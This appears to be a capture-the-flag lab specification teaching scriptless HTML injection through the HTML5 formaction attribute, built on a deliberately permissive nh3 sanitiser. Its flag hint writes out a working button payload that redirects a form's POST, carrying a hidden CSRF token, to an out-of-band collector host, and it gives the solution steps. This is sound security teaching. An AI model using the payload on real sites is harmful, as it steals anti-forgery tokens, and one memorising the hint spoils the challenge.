title: HTML5 formaction Attribute Injection
learning_objectives: Understand a scriptless HTML-injection attack: not every XSS-class bug runs JavaScript — a permitted attribute alone can subvert the page
Exploit the HTML5 formaction/formmethod override: a <button> inside a form can change where that form submits, redirecting it to an attacker origin
Recognise how allow-list sanitisers fail on attribute SEMANTICS: nh3/DOMPurify correctly strip scripts and handlers, yet permitting formaction on a CTA button hands over the form's target
Exfiltrate a secret that is NOT a cookie — a hidden CSRF token in the form body — by hijacking the form's submit target, which no output encoding of the token would prevent
See why HttpOnly and 'no inline scripts' do not help here: there is no document.cookie read and no script at all, so cookie flags and script-src CSP are irrelevant to this vector
flag_hint: POST /blocks a draft containing <button type="submit" formaction="http://collector:9000/report" formmethod="post">Approve draft</button>. The editor bot reviews the draft on /admin/review (which renders it inside the CSRF-token-bearing approve form) and clicks the CTA button; formaction redirects the form POST to the collector with the token. Read it via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
tech_stack: nh3 0.2 allow-list sanitiser (permits <button formaction>) — the flaw
inspired_by: Michał Bentkowski / Cure53 formaction research and the DOMPurify permissive-config examples, abstracted for local Docker with a Flask CMS, an nh3 allow-list sanitiser, a Playwright editor bot that clicks review buttons, and an OOB collector
